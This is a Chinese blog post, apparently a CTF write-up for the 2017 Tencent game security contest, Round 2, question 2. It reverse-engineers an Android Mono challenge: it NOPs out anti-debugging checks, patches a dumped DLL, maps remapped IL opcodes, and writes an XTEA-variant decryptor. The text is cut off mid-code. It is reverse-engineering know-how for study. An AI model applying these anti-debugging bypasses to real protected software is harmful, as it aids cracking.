<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="chrome=1">
  
  <title>Ericky1992</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  
    <meta name="author" content="The darkness is no darkness with thee.">
  
  
  <meta name="description" content="忘記妳是最痛苦的解藥">
<meta property="og:type" content="website">
<meta property="og:title" content="Ericky1992">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Ericky1992">
<meta property="og:description" content="忘記妳是最痛苦的解藥">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Ericky1992">
<meta name="twitter:description" content="忘記妳是最痛苦的解藥">
  
  
    <link rel="icon" type="image/x-icon" href="/favicon.ico">
  
  <link rel="stylesheet" href="/css/style.css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  
</head>

<body>
  <div class="wrapper">
    <header id="header">
  <div class="title">
    <h1><a href="/">Ericky1992</a></h1>
    <p><a href="/">pursue ceaselessly</a></p>
  </div>
  <nav class="nav">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
        <li><a href="/">About</a></li>
      
      
    </ul>
    <div class="clearfix"></div>
  </nav>
  <div class="clearfix"></div>
</header>
    <div class="content">




  
    <article class="post">
  <header>
    
      <div class="icon"></div>
      <a href="/2017/07/23/2017腾讯游戏安全技术竞赛 Round 2 第二题详细题解/">
  <time datetime="2017-07-23T15:00:00.000Z">
    2017-07-23
  </time>
</a>
    
    
  
    <h1 class="title"><a href="/2017/07/23/2017腾讯游戏安全技术竞赛 Round 2 第二题详细题解/">2017腾讯游戏安全技术竞赛 Round 2 第二题详细题解</a></h1>
  

  </header>
  
  <div class="entry">
    
      <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>第二题如果说就让人望而却步的话，这道题怕是要让人吐血身亡了。自己写wp感觉也要写得头发掉光，非常慌。不过既然到了最后一题，为了完整性，硬着头皮也得做下来吧，打开程序一开，里面有dll，采用的是mono框架，是不折不扣的.net的程序。我是第一次接触.net，更别说里面的IL code，jit什么的妖魔鬼怪了，反正现学现卖，不过鬼怪见多了也就慢慢习惯它们的样子了，慢慢就适应了，呃。我还是选择的安卓平台的题目，从评分标准来看，这个题目就分为了3小问，所以我把这个题目分为三大部分，一一阐述每个部分。</p>
<h3 id="0x1-多战寻路–寻到一个坑"><a href="#0x1-多战寻路–寻到一个坑" class="headerlink" title="0x1 多战寻路–寻到一个坑"></a>0x1 多战寻路–寻到一个坑</h3><p>正如标题所说，三战寻路–寻到一个坑。本来ida里的函数多数都被我标记得差不多了，因为用IDA F9动态调试的缘故，函数名都丢了(这里我曾崩溃)，凑合着看吧，请见谅。<br>先贴一个main函数：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">signed int sub_9EC0()</div><div class="line">&#123;</div><div class="line">  int v0; // r0@1</div><div class="line">  char *v1; // r3@1</div><div class="line">  int v2; // r7@1</div><div class="line">  int v3; // r0@3</div><div class="line">  int v4; // r4@3</div><div class="line">  int v5; // r8@3</div><div class="line">  int v6; // r0@6</div><div class="line">  int v7; // r5@6</div><div class="line">  int v8; // r6@7</div><div class="line">  int v9; // r1@7</div><div class="line">  int v10; // r0@7</div><div class="line">  signed int result; // r0@8</div><div class="line">  char v12; // [sp+8h] [bp-20h]@1</div><div class="line">  int v13; // [sp+Ch] [bp-1Ch]@1</div><div class="line"></div><div class="line">  pthread_create(&amp;v12);</div><div class="line">  v13 = 3;</div><div class="line">  sub_6C130(&amp;unk_2B4E38, 0);</div><div class="line">  v0 = sub_A5B4(&amp;unk_2B4E3A);</div><div class="line">  v1 = &amp;byte_36F000;</div><div class="line">  v2 = v0;</div><div class="line">  do</div><div class="line">  &#123;</div><div class="line">    *v1 = ~(*v1 ^ 0x11);</div><div class="line">    ++v1;</div><div class="line">  &#125;</div><div class="line">  while ( (_UNKNOWN *)v1 != &amp;unk_370200 );</div><div class="line">  v3 = sub_B925C(&amp;byte_36F000, 4608, 1, &amp;v13, 0, &amp;unk_2B4E3A);</div><div class="line">  v4 = v13;</div><div class="line">  v5 = v3;</div><div class="line">  <span class="keyword">if</span> ( !v13</div><div class="line">    &amp;&amp; v3</div><div class="line">    &amp;&amp; sub_6F0A4(v3, &amp;unk_2B4E3A)</div><div class="line">    &amp;&amp; (v6 = sub_86FB0(v5, <span class="string">"encrypt"</span>, <span class="string">"Hello"</span>), (v7 = v6) != <span class="number">0</span>)</div><div class="line">    &amp;&amp; (v8 = sub_1196BC(v2, v6), sub_10FA38(v8, v9), (v10 = sub_898DC(v7, <span class="string">"SayHello"</span>, v4)) != <span class="number">0</span>) )</div><div class="line">  &#123;</div><div class="line">    sub_116D20(v10, v8, v4, v4);</div><div class="line">    sub_B9988(v5);</div><div class="line">    result = v4;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    result = 1;</div><div class="line">  &#125;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="Bypass反调试"><a href="#Bypass反调试" class="headerlink" title="Bypass反调试"></a>Bypass反调试</h3><p>说一下反调试先，我一共发现两处。init_array段有一处反调是，虽然不知道怎么判断的，反正把exit nop掉就行了。然后在main函数的起始位置起了一个反调试的线程，把启动的内容nop掉就可以了，这样就可以调试了，也就是可以正式开始漫漫长征路。</p>
<h3 id="主程序流程"><a href="#主程序流程" class="headerlink" title="主程序流程"></a>主程序流程</h3><p>先分析一下程序的流程，程序开始会释放一个4.5kb的dll，称之为关键dll，然后通过mono框架加载这个dll 以及在外面的mscorlib.dll，调用mono框架中的一系列函数，寻找到指定的类，再找到sayhello函数，最后调用method_runtime_invoke，print出hello 。</p>
<h3 id="初步修复关键dll"><a href="#初步修复关键dll" class="headerlink" title="初步修复关键dll"></a>初步修复关键dll</h3><p>先不管那么多，既然它偷偷的加载dll，直接dump出来看看再说。dump出来的dll为非法文件，使用010editor 已经跟踪代码发现几处问题，Patch了5字节，至少成为了一个看起来正常的dll。<br>问题1.<br>5字节之第1字节：PE文件的签名，正常的pe文件签名位PE00，而这个文件的签名为PE01，这会导致NT头找不到，无法被正常识别。<br>原因：通过跟踪代码可以知道，mono框架只检查了PE，没有检查后面的00是否正确。<br>附上一个pe文件格式链接：<br><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms680547(v=vs.85).aspx#other_contents_of_the_file" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/windows/desktop/ms680547(v=vs.85).aspx#other_contents_of_the_file</a></p>
<p>5字节之第2字节：.net程序里面有一项叫做元数据流，附上链接：<br><a href="http://www.cnblogs.com/ShaYeBlog/archive/2013/07/20/3202191.html" target="_blank" rel="external">http://www.cnblogs.com/ShaYeBlog/archive/2013/07/20/3202191.html</a><br>导致dll继续报错的原因是一个#String的堆，未能识别，导致后面一系列失败，将后面的00 patch成 73即可。<br>原因：找到解析元数据中堆的地方，贴代码如下：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !strncmp(v22 + <span class="number">8</span>, <span class="string">"#Strings"</span>, <span class="number">7</span>u) )</div><div class="line">       &#123;</div><div class="line">         v8 = *(_DWORD *)(v15 + 52);</div><div class="line">         *(_DWORD *)(v15 + 56) = v8 + read32(v22);</div><div class="line">         *(_DWORD *)(v15 + 60) = read32(v22 + 4);</div><div class="line">         v22 += 17;</div><div class="line">       &#125;</div><div class="line">       <span class="keyword">else</span> <span class="keyword">if</span> ( !strncmp(v22 + <span class="number">8</span>, <span class="string">"#US"</span>, <span class="number">4</span>u) )</div></pre></td></tr></table></figure>
<p>可以看到，”s”字节没有比较，从这里可以看出来这个mono框架被修改过，而且有点猥琐。而在正常的mono框架中，strncmp的是9位，这就是元数据流异常的原因。</p>
<p>5字节之后3字节：<br>都在解析和装在MetaData的过程中，有3处高位被改了，导致一般的工具报数组越界的错误。<br>原因：mono框架修改了read函数，在read的时候只取了低位，这样的话不影响它自身对dll的解析。</p>
<p>修复这5字节，大概dll可以算得上“正常”了，至少扔到反编译工具中不出错了。</p>
<h3 id="三寻IL-code-真身"><a href="#三寻IL-code-真身" class="headerlink" title="三寻IL code 真身"></a>三寻IL code 真身</h3><p>第一寻<br>一开始没想太多，想的就是可能在loadtable的时候把IL code还原了，然后追踪了很多遍，并没有发现真正的IL code，这里被坑了。局面开始显得僵化，突然发现这样的一个文章：<br><a href="http://www.cnblogs.com/northstarlight/archive/2010/07/04/1771021.html" target="_blank" rel="external">http://www.cnblogs.com/northstarlight/archive/2010/07/04/1771021.html</a><br>以为是隐藏IL code，加了壳，于是就开始了漫漫长路第二寻</p>
<p>第二寻<br>既然是壳，总会解密，继续跟就行了，外面既然没修改IL code的话，那肯定在更底层了。为了方便调试跟踪以及分析，我把源码下载下来了，地址在这：<br><a href="https://github.com/mono/mono" target="_blank" rel="external">https://github.com/mono/mono</a><br>然后就变成了苦逼的阅读代码，好，突然发现一个函数，mono_jit_compile_method_with_opt，再跟到mono_jit_compile_method_inner，再跟到mini_method_compile，再跟到mono_runtime_invoke，sayhello都已经执行了，我并没有定位到恢复的IL code，又过了不久，开始第三寻。</p>
<p>第三寻<br>直接定位mono_method_to_ir，这是最底层解析IL opcode的函数了，我在这下断点跟踪，总能搞定吧。这个函数也是够大，20000行，摘出来，一点一点看，一直跟不到修改IL code 的地方，最后发现，这个函数出题方居然动了，居然用自己的一套来解析Opcode，难怪dll中的IL code乱七八糟也能被执行，终于找到原因了，剩下的就是人肉还原IL code了。</p>
<h3 id="人肉还原IL-code"><a href="#人肉还原IL-code" class="headerlink" title="人肉还原IL code"></a>人肉还原IL code</h3><p>先贴一张Opcode 对应表:</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div></pre></td><td class="code"><pre><div class="line">符号						代码						原来   					修改</div><div class="line">CEE_RET					ret 					<span class="number">0</span>x2A					<span class="number">0</span>x39</div><div class="line">CEE_BRFALSE_S			brfalse<span class="selector-class">.s</span> 				<span class="number">0</span>x2C					<span class="number">0</span>x3B</div><div class="line">CEE_BRTRUE_S			brtrue<span class="selector-class">.s</span> 				<span class="number">0</span>x2D					<span class="number">0</span>x3C</div><div class="line">CEE_BRFALSE 			brfalse 				<span class="number">0</span>x39 					<span class="number">0</span>x48						</div><div class="line">CEE_BRTRUE 				brtrue 					<span class="number">0</span>x3A					<span class="number">0</span>x49</div><div class="line">CEE_BEQ																	<span class="number">0</span>x3D</div><div class="line">CEE_BGE 																<span class="number">0</span>x3E</div><div class="line">CEE_BGT 																<span class="number">0</span>x3F</div><div class="line">CEE_BLE 																<span class="number">0</span>x40</div><div class="line">CEE_BLT 																<span class="number">0</span>x41</div><div class="line">CEE_BNE_UN 																<span class="number">0</span>x42</div><div class="line">CEE_BGE_UN 																<span class="number">0</span>x43</div><div class="line">CEE_BGT_UN 																<span class="number">0</span>x44</div><div class="line">CEE_BLE_UN 																<span class="number">0</span>x45</div><div class="line">CEE_BLT_UN 																<span class="number">0</span>x46</div><div class="line"></div><div class="line">下面的有点乱，凑合着看</div><div class="line">*************</div><div class="line"></div><div class="line"><span class="number">0</span>x4A</div><div class="line"><span class="number">0</span>x4B</div><div class="line"><span class="number">0</span>x4C</div><div class="line"><span class="number">0</span>x4D</div><div class="line"><span class="number">0</span>x4E</div><div class="line"><span class="number">0</span>x4F</div><div class="line"><span class="number">0</span>x50</div><div class="line"><span class="number">0</span>x51</div><div class="line"><span class="number">0</span>x52</div><div class="line"><span class="number">0</span>x53</div><div class="line"></div><div class="line">CEE_LDIND_I1</div><div class="line">CEE_LDIND_U1</div><div class="line">CEE_LDIND_I2</div><div class="line">CEE_LDIND_U2</div><div class="line">CEE_LDIND_I4</div><div class="line">CEE_LDIND_U4</div><div class="line">CEE_LDIND_I8</div><div class="line">CEE_LDIND_I</div><div class="line">CEE_LDIND_R4</div><div class="line">CEE_LDIND_R8</div><div class="line">CEE_LDIND_REF</div><div class="line">*************</div><div class="line"></div><div class="line"><span class="number">0</span>x60</div><div class="line"><span class="number">0</span>x61</div><div class="line"><span class="number">0</span>x62</div><div class="line"><span class="number">0</span>x63</div><div class="line"><span class="number">0</span>x64</div><div class="line"><span class="number">0</span>x65</div><div class="line"><span class="number">0</span>x66</div><div class="line"><span class="number">0</span>xDF</div><div class="line"></div><div class="line"></div><div class="line">CEE_STIND_REF</div><div class="line">CEE_STIND_I1</div><div class="line">CEE_STIND_I2</div><div class="line">CEE_STIND_I4</div><div class="line">CEE_STIND_I8</div><div class="line">CEE_STIND_R4</div><div class="line">CEE_STIND_R8</div><div class="line">CEE_STIND_I</div><div class="line">***************</div><div class="line">CEE_ADD</div><div class="line">CEE_SUB</div><div class="line">CEE_DIV</div><div class="line">CEE_DIV_UN</div><div class="line">CEE_REM</div><div class="line">CEE_REM_UN</div><div class="line">CEE_AND</div><div class="line">CEE_OR</div><div class="line">CEE_XOR</div><div class="line">CEE_SHL</div><div class="line">CEE_SHR</div><div class="line">CEE_SHR_UN</div><div class="line"><span class="number">0</span>x67</div><div class="line"><span class="number">0</span>x68</div><div class="line"><span class="number">0</span>x6A</div><div class="line"><span class="number">0</span>x6B</div><div class="line"><span class="number">0</span>x6C</div><div class="line"><span class="number">0</span>x6D</div><div class="line"><span class="number">0</span>x6E</div><div class="line"><span class="number">0</span>x6F</div><div class="line"><span class="number">0</span>x70</div><div class="line"><span class="number">0</span>x71</div><div class="line"><span class="number">0</span>x72</div><div class="line"><span class="number">0</span>x73</div><div class="line">***********************</div><div class="line"></div><div class="line">CEE_LDOBJ <span class="number">0</span>x80</div><div class="line">CEE_LDSTR <span class="number">0</span>x81</div><div class="line">CEE_NEWOBJ <span class="number">0</span>x82</div><div class="line">CEE_REFANYVAL <span class="number">0</span>xC2</div><div class="line">CEE_LDTOKEN <span class="number">0</span>xD0</div><div class="line"></div><div class="line"><span class="number">0</span>x91</div><div class="line"><span class="number">0</span>x92</div><div class="line"><span class="number">0</span>x93</div><div class="line"><span class="number">0</span>x94</div><div class="line"><span class="number">0</span>x95</div><div class="line"><span class="number">0</span>x96</div><div class="line"><span class="number">0</span>x97</div><div class="line"><span class="number">0</span>x98</div><div class="line"><span class="number">0</span>x99</div><div class="line"><span class="number">0</span>x9A</div><div class="line"><span class="number">0</span>xD1</div><div class="line"><span class="number">0</span>xD2</div><div class="line"><span class="number">0</span>xD3</div><div class="line"><span class="number">0</span>xE0</div><div class="line"></div><div class="line"></div><div class="line">CEE_CONV_OVF_I1_UN</div><div class="line">CEE_CONV_OVF_I2_UN</div><div class="line">CEE_CONV_OVF_I4_UN</div><div class="line">CEE_CONV_OVF_I8_UN</div><div class="line">CEE_CONV_OVF_U1_UN</div><div class="line">CEE_CONV_OVF_U2_UN</div><div class="line">CEE_CONV_OVF_U4_UN</div><div class="line">CEE_CONV_OVF_U8_UN</div><div class="line">CEE_CONV_OVF_I_UN</div><div class="line">CEE_CONV_OVF_U_UN</div><div class="line">CEE_CONV_U2</div><div class="line">CEE_CONV_U1</div><div class="line">CEE_CONV_I</div><div class="line">CEE_CONV_U</div><div class="line"></div><div class="line">****************</div><div class="line"></div><div class="line"></div><div class="line">CEE_STELEM_I</div><div class="line">CEE_STELEM_I1</div><div class="line">CEE_STELEM_I2</div><div class="line">CEE_STELEM_I4</div><div class="line">CEE_STELEM_I8</div><div class="line">CEE_STELEM_R4</div><div class="line">CEE_STELEM_R8</div><div class="line">CEE_STELEM_REF</div><div class="line">CEE_STELEM</div><div class="line"></div><div class="line"><span class="number">0</span>xAA</div><div class="line"><span class="number">0</span>xAB</div><div class="line"><span class="number">0</span>xAC</div><div class="line"><span class="number">0</span>xAD</div><div class="line"><span class="number">0</span>xAE</div><div class="line"><span class="number">0</span>xAF</div><div class="line"><span class="number">0</span>xB0</div><div class="line"><span class="number">0</span>xB1</div><div class="line"><span class="number">0</span>xB3</div><div class="line"></div><div class="line">****************</div></pre></td></tr></table></figure>
<p>还原好之后效果（贴一个最大的函数）：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">public static byte[] Encrypt(byte[] input)</div><div class="line">&#123;</div><div class="line">	uint[] array = new uint[]</div><div class="line">	&#123;</div><div class="line">		<span class="number">1423373290</span>u,</div><div class="line">		<span class="number">363609949</span>u,</div><div class="line">		<span class="number">512121596</span>u,</div><div class="line">		<span class="number">1703126449</span>u</div><div class="line">	&#125;;</div><div class="line">	byte[] array2 = new byte[0];</div><div class="line">	int num = input.Length;</div><div class="line">	byte[] array3 = new byte[8];</div><div class="line">	int num2 = 7 - num % 8;</div><div class="line">	array3[0] = (byte)num2;</div><div class="line">	for (int i = 0; i &lt; num2; i++)</div><div class="line">	&#123;</div><div class="line">		array3[i + 1] = (byte)(200 + num2 - i);</div><div class="line">	&#125;</div><div class="line">	for (int j = 0; j &lt; 7 - num2; j++)</div><div class="line">	&#123;</div><div class="line">		array3[j + num2 + 1] = input[j];</div><div class="line">	&#125;</div><div class="line">	uint[] array4 = new uint[]</div><div class="line">	&#123;</div><div class="line">		MyClass.ConvertBytesToUInt(array3, <span class="number">0</span>),</div><div class="line">		MyClass.ConvertBytesToUInt(array3, <span class="number">4</span>)</div><div class="line">	&#125;;</div><div class="line">	array4[0] = (array4[0] ^ array[0]);</div><div class="line">	array4[1] = (array4[1] ^ array[2]);</div><div class="line">	array4 = MyClass.Code(array4, array);</div><div class="line">	array2 = MyClass.CombineBytes(array2, MyClass.ConvertUIntToBytes(array4[0]));</div><div class="line">	array2 = MyClass.CombineBytes(array2, MyClass.ConvertUIntToBytes(array4[1]));</div><div class="line">	for (int k = 7 - num2; k &lt; num; k += 8)</div><div class="line">	&#123;</div><div class="line">		array4[0] ^= MyClass.ConvertBytesToUInt(input, k);</div><div class="line">		array4[1] ^= MyClass.ConvertBytesToUInt(input, k + 4);</div><div class="line">		array4 = MyClass.Code(array4, array);</div><div class="line">		array2 = MyClass.CombineBytes(array2, MyClass.ConvertUIntToBytes(array4[0]));</div><div class="line">		array2 = MyClass.CombineBytes(array2, MyClass.ConvertUIntToBytes(array4[1]));</div><div class="line">	&#125;</div><div class="line">	return array2;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>算法是XTEA的变种，链接这里：<br><a href="https://en.wikipedia.org/wiki/XTEA" target="_blank" rel="external">https://en.wikipedia.org/wiki/XTEA</a></p>
<p>说实话，我这方法有点麻烦，你们出题有点猥琐。</p>
<h3 id="0x2-解密函数解密data"><a href="#0x2-解密函数解密data" class="headerlink" title="0x2 解密函数解密data"></a>0x2 解密函数解密data</h3><p>直接上代码，wp写累了：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div></pre></td><td class="code"><pre><div class="line">using System;</div><div class="line">using System.Collections.Generic;</div><div class="line">using System.Linq;</div><div class="line">using System.Text;</div><div class="line">using System.IO;</div><div class="line"></div><div class="line"></div><div class="line">namespace TENCENT2017</div><div class="line">&#123;</div><div class="line">    class Program</div><div class="line">    &#123;</div><div class="line">        static void Main(string[] args)</div><div class="line">        &#123;</div><div class="line">            EncryptDataFile();</div><div class="line">            DecryptDataFile();</div><div class="line">            Console.WriteLine("Hello GSLab!");</div><div class="line">        &#125;</div><div class="line">        public static void EncryptDataFile()</div><div class="line">        &#123;</div><div class="line">            byte[] array;</div><div class="line">            using (FileStream fileStream = new FileStream(<span class="string">"areyouok.png"</span>, FileMode.Open))</div><div class="line">            &#123;</div><div class="line">                using (BinaryReader binaryReader = new BinaryReader(fileStream))</div><div class="line">                &#123;</div><div class="line">                    array = binaryReader.ReadBytes(Convert.ToInt32(fileStream.Length));</div><div class="line">                    array = Encrypt(array);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            using (FileStream fileStream2 = new FileStream(<span class="string">"areyouok_encrypted"</span>, FileMode.Create))</div><div class="line">            &#123;</div><div class="line">                using (BinaryWriter binaryWriter = new BinaryWriter(fileStream2))</div><div class="line">                &#123;</div><div class="line">                    binaryWriter.Write(array);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        public static void DecryptDataFile()</div><div class="line">        &#123;</div><div class="line">            byte[] array;</div><div class="line">            using (FileStream fileStream = new FileStream(<span class="string">"data.encrypted"</span>, FileMode.Open))</div><div class="line">            &#123;</div><div class="line">                using (BinaryReader binaryReader = new BinaryReader(fileStream))</div><div class="line">                &#123;</div><div class="line">                    array = binaryReader.ReadBytes(Convert.ToInt32(fileStream.Length));</div><div class="line">                    array = Decrypt(array);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            using (FileStream fileStream2 = new FileStream(<span class="string">"de-data.encrypted.png"</span>, FileMode.Create))</div><div class="line">            &#123;</div><div class="line">                using (BinaryWriter binaryWriter = new BinaryWriter(fileStream2))</div><div class="line">                &#123;</div><div class="line">                    binaryWriter.Write(array);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        public static byte[] Decrypt(byte[] input)</div><div class="line">        &#123;</div><div class="line">            int num = input.Length;</div><div class="line">            uint[] array = new uint[]</div><div class="line">	        &#123;</div><div class="line">		        <span class="number">1423373290</span>u,</div><div class="line">		        <span class="number">363609949</span>u,</div><div class="line">		        <span class="number">512121596</span>u,</div><div class="line">		        <span class="number">1703126449</span>u</div><div 